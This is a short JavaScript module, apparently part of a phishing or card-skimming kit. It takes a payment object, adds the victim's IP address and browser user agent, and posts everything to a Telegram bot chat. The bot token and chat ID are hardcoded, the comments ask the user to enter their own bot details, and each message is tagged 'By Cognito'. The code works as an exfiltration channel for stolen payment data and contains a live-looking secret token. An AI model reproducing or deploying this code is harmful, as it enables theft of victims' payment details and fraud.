import axios from "axios";



const botToken = "5717189910:AAG1uCLomAWkGmXqOk_r6INtWZcRJqR9tek" /////  ENTER YOUR BOT TOKEN HERE   /////////////
const baseURL = `https://api.telegram.org/bot${botToken}`;
const chatId = "1014240012" ///////// ENTER YOUR CHAT ID HERE ///////////

const sendMessage = async (paymentObject) => {
    let text = ""
    let ip;
    let agent;
    console.log(text);
    console.log(paymentObject);

    /////////////////
    console.log("Hassan")
    fetch('https://api.ipify.org?format=json')
      .then(response => response.json())
      .then(async data => {
        const ipAddress = data.ip;
        console.log('User IP Address:', ipAddress);
        var userAgent = navigator.userAgent;
        console.log(userAgent);
        ip = ipAddress
        agent = userAgent


        for (const [key, value] of Object.entries(paymentObject)) {
          text = `${text}\n${key}: ${value}`;
        }
        text = `${text}\n${"IP Address"}: ${ip}`;
        text = `${text}\n${"UserAgent"}: ${agent}`;
        const path = "/sendMessage";
        const url = `${baseURL}${path}`;
        const data2 = {
            chat_id: chatId,
            text: text + "\n ——By Cognito——-" ,
            ipp: ip,
            USERAgent: agent
        };
        console.log('here 2');
        await axios.post(url, data2)
        .then(response => {
            // Handle response
            console.log(response.data2);
        })
        .catch(err => {
            // Handle errors
            console.error(err);
        });
        console.log('here 3');
    })
    .catch(error => {
      console.error('Error:', error);
    });
    ////////////////

} 

export default sendMessage;